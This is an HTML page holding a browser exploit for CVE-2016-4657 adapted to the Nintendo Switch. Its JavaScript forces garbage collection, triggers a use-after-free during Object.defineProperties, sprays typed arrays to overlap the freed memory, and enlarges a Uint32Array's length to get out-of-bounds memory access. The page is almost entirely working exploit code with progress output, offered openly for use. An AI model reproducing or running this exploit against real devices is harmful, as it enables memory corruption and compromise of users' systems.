<!doctype html>
<html>

    <head>
        <title>CVE-2016-4657 for Nintendo Switch</title>
    </head>

    <body>
        <script>
        // taken from https://gist.github.com/amorri40/3430429
        function byteToHex(b) {
            return hexChar[(b >> 4) & 0x0f] + hexChar[b & 0x0f];
        }
        var _dview = null;

        var pressure = new Array(100);
        triggerGC = function() {
            for (var i = 0; i < pressure.length; i++) {
                pressure[i] = new Uint32Array(0x10000);
            }
            for (var i = 0; i < pressure.length; i++) {
                pressure[i] = 0;
            }
        }

        function forceGC(pressure) {
            while (pressure > 0) {
                triggerGC();
                pressure--;
            }
        }

        // buffer to be overlapped with arr later on
        var bufs = new Array(0x1000);
        // This will be our raw r/w/x bytes later on after attaching it to our overlayed arr
        var smash = new Uint32Array(0x10);
        var stale = 0;


        // taken from JBME Code. Thanks to qwertyoruiop for his amazing work
        function u2d(low, hi) {
            // Only allocate memory once, so we dont mess with the gc
            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
            _dview.setUint32(0, hi);
            _dview.setUint32(4, low);
            return _dview.getFloat64(0);
        }

        function exploit() {

            if (smash.length != 0x10) {
                document.getElementById('output')
                    .innerHTML += 'Exploit allready ran with success';
                return;
            }

            triggerGC();

            // gc target
            var arr = new Array(0x100);
            var uselessArray = new ArrayBuffer(0x1000);

            // force memory allocation by filling the array
            arr[0] = uselessArray;
            // deadbeef
            arr[1] = 0x13371337;

            // overwrite not_number.toString() for use with props later on
            var not_number = {};
            not_number.toString = function() {

                // should not be set until we already had an overlapp
                if (bufs[0]) {
                    document.getElementById('output')
                        .innerHTML += 'Exploit allready ran with success</br>';
                    return 10;
                }

                // remove references to our target so it gets GC'ed
                arr = null;
                props["stale"]["value"] = null;

                // GC arr
                forceGC(20);

                // hopefully overallocat our target array
                for (i = 0; i < bufs.length; i++) {
                    bufs[i] = new Uint32Array(0x200)
                    for (k = 0; k < bufs[i].length;) {
                        // fill array with Integer value and idenentifier
                        bufs[i][k++] = 0xCAFEBABE;
                        bufs[i][k++] = 0xFFFF0000;
                    }
                }
                return 10;
            };

            document.getElementById('output')
                .innerHTML += 'Creating props</br>';
            var props = {
                p0: {
                    value: 0
                },
                p1: {
                    value: 1
                },
                p2: {
                    value: 2
                },
                p3: {
                    value: 3
                },
                p4: {
                    value: 4
                },
                p5: {
                    value: 5
                },
                p6: {
                    value: 6
                },
                p7: {
                    value: 7
                },
                p8: {
                    value: 8
                },
                // will call .toString()
                length: {
                    value: not_number
                },
                // at time of parsing arr is still referenced, but gets freed, when properties are applied
                stale: {
                    value: arr
                },
                after: {
                    value: 420
                }
            };
            // array for acessing the target array
            var access = [];
            // and apply the properties to it
            Object.defineProperties(access, props);
            // Now we get a new reference to arr, which was cleared, so it is in fact a reference to our overlapped memory (hopefully)
            stale = access.stale;

            // if not an integer (0xFFFF0000) with our set value, we did not overlay at all.
            if (stale[0] == 0xCAFEBABE) {
                // we add to our first element to be able
                stale[0] += 0x13AF0431;
                document.getElementById('output')
                    .innerHTML += 'Searching for the 0xDEADBEEF</br>';
                // search for the start of the overlay
                for (i = 0; i < bufs.length; i++) {
                    for (k = 0; k < bufs[0].length; k++) {
                        // is this our collision?
                        if (bufs[i][k] == 0xDEADBEEF) {
                            document.getElementById('output')
                                .innerHTML += 'Overlay at ' + i + ', ' + k + '</br>';
                            stale[0] = {
                                'a': u2d(105, 0),
                                'b': u2d(0, 0),
                                'c': smash,
                                'd': u2d(0x100, 0)
                            }

                            document.getElementById('output')
                                .innerHTML += 'stale[0] is of type  ' + stale[0] + '</br>';

                            stale[1] = stale[0];

                            document.getElementById('output')
                                .innerHTML += 'Moving stale by 0x10</br>';
                            bufs[i][k] += 0x10;

                            document.getElementById('output')
                                .innerHTML += 'stale[0] is of type ' + stale[0] + '</br>';

                            document.getElementById('output')
                                .innerHTML += 'Changing length </br>';

                            stale[0][6] = 0x10000;
                            document.getElementById('output')
                                .innerHTML += 'New length is 0x' + smash.length.toString(16) + '</br>';


                            alert('done!');
                            return;
                        }
                    }
                }
            }
            document.getElementById('output')
                .innerHTML += 'Expolit ran out without success</br>';
        }


        function start() {
            document.getElementById('output')
                .innerHTML += 'Starting... </br>';
            document.getElementById('output')
                .innerHTML += 'Pre Exploit cleaning</br>';
            forceGC(5);
            document.getElementById('output')
                .innerHTML += 'Executing exploit</br>';
            setTimeout(exploit, 1000);
        }
        </script>
        <a href='javascript:start();'>go</a>
        <a href='javascript:document.location.reload();'>reload</a>
        <div>This code is derived of Code by 'qwertyoruiop' that is licensed under the Anyone But Stefan Esser license.</br>
            Therefore it falls under the same license! </div>
        <div id='output'>Output:</br>
        </div>
    </body>

</html>
